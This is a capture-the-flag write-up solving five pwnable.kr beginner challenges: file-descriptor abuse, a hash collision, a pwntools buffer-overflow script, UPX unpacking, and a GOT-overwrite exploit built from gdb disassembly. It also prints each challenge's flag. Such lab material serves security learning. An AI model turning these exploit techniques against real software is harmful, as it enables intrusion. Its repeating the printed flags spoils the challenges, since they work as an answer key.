# Toddler's Bottle

## fd
use 4660 as argument(-> fd = 4660 - 0x1234 = 0 = stdin)
and then enter 'LETMEWIN'  
**Flag**  
mommy! I think I know what a file descriptor is!!

## collision
We need to insert string the when sum up as integer will equal to 
Choose one of the input from the output of this [python script](https://gist.github.com/bom2013/63ec0bc880f6a82e775d9dce7a2358fe), for example the generated arg for 'P' letter
```bash
col@pwnable:~$ python3 /tmp/collision_arg_generator.py
....
-----
Test P
Oh yeh!
0x50505050 0x50505050 0x50505050 0x50505050 0xe09bc8ac
...
col@pwnable:~$ ./col `printf "PPPPPPPPPPPPPPPP\xac\xc8\x9b\xe0"`
```  
**Flag**  
daddy! I just managed to create a hash collision :)

## bof
Simple buffer overflow, I try to do it directedly from the shell without success, so do it with python `pwntools` lib
```python
from pwn import *

message = 'a'*52 + "\xbe\xba\xfe\xca"
nc = remote("pwnable.kr",9000)
nc.send(message)
nc.interactive()
```  
**Flag**  
daddy, I just pwned a buFFer :)

## flag
Use 'strings' to search which packer -> UPX  
Use 'upx -d flag' to unpack  
Use 'string' to find the flag  
**Flag**  
UPX...? sounds like a delivery service :)


## passcode
When gcc the file get warning about pass 'int' and not 'int *'  
This means writing to a value that is in the variable 'passcode1'-> Junk seemingly  
Is there a way to change it before we get there and thus write to the good place?  
In the "welcome" function(Which performed before login function) we write to 'name', by using gdb you see the location of **'name'** variable in the stack:
```shell
(gdb) disas welcome
Dump of assembler code for function welcome:
   ...
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   ...
End of assembler dump.
```
-> &name = ebp-0x70  
welcome and login using the same stack...  
lets see the location of **'passcode1'** in the stack using gdb:
```shell
(gdb) disas login
Dump of assembler code for function login:
   ...
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   ...
End of assembler dump.
```
-> &passcode1 = ebp-0x10  
-> the distance between them is 0x70-0x10 = 96, we can write 100 -> we can overwrite 4 byte of passcode1 -> Yoo!  
What will we write? We want to put a value of a place in the memory that we then jump from, Fortunately we have a call to the **fflush** function that is not executed directly but through the plt mechanism so we have a jump:
```shell
(gdb) disas fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    *0x804a004
   0x08048436 <+6>:     push   $0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
```
So if we put the value 0x804a004 in passcode before we get input to him, when we will get the the point we put input we can insert the address we want the program to jump to.  
Lets find this address using gdb:
```shell
(gdb) disas login
Dump of assembler code for function login:
   ...
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)   # "/bin/cat flag"
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   ...
End of assembler dump.
```
So, we will put 96 garbage chars and than 0x0804a004 to **'name'** and then enter 0x080485e3 to passcode1:
```shell
passcode@pwnable:~$ python -c "print 'A'*96 + '\x04\xa0\x04\x08' + str(int('0x080485e3', 16))" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```  
**Flag**  
Sorry mom.. I got confused about scanf usage :(
